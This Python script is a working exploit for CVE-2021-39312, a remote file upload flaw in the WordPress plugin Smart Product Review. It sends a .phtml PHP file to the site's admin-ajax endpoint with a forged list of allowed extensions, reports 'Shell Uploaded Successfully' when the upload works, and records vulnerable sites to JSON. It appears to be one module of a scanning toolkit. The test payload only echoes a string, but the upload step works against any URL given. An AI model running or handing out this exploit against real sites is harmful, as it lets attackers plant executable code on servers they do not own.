import sys
import os
try:
    # The insertion index should be 1 because index 0 is this file
    sys.path.insert(1, '{}/help'.format(
        os.getcwd()))  # the type of path is string
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request

except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")


def exploit(url):
    if not (url.startswith('https://') or url.startswith('http://')):
        url = 'http://' + url
    req = request(url)
    found = []
    try:
        files = {
            'files': ('poc.phtml', '<?php echo "poc By eng Yazeed"; ?>',
                      'application/html')
        }

        data = {
            "allowedExtensions[0]": "jpg",
            "allowedExtensions[1]": "php4",
            "allowedExtensions[2]": "phtml",
            "allowedExtensions[3]": "png",
            "qqfile": "files",
            "element_id": "6837",
            "sizeLimit": "12000000",
            "file_uploader_nonce": "2b102311b7"
        }
        print("Uploading Shell...")
        _POST = req.post(
            f"{url}/wp-admin/admin-ajax.php?action=sprw_file_upload_action",
            files=files,
            data=data)
        if _POST.status_code == 200:
            print(colors.yellow +
                  "[+] ==> Smart Product Review %s  Likely to be Vulnerable" %
                  url)
            if "ok" in _POST.text:
                print(
                    colors.cyan +
                    "[+] ==> Shell Uploaded Successfully  ==> AND  Its Vulnerable %s"
                    % url)
                found.append({
                    "url":
                    url,
                    "payload":
                    "poc.phtml",
                    "status":
                    _POST.status_code,
                    "exploit":
                    "CVE-2021-39312",
                    "vuln":
                    "WordPress Plugin Smart Product Review <= 1.0.1 - Remote File Upload"
                })
                json_me(url, "CVE-2021-39312", found)
            else:
                print(colors.red +
                      "[-] ==> Smart Product Review %s Not Vulnerable" % url)

        else:
            print(colors.red +
                  "[-] ==> Smart Product Review %s Not Vulnerable" % url)

    except Exception as e:
        print(e)

        pass
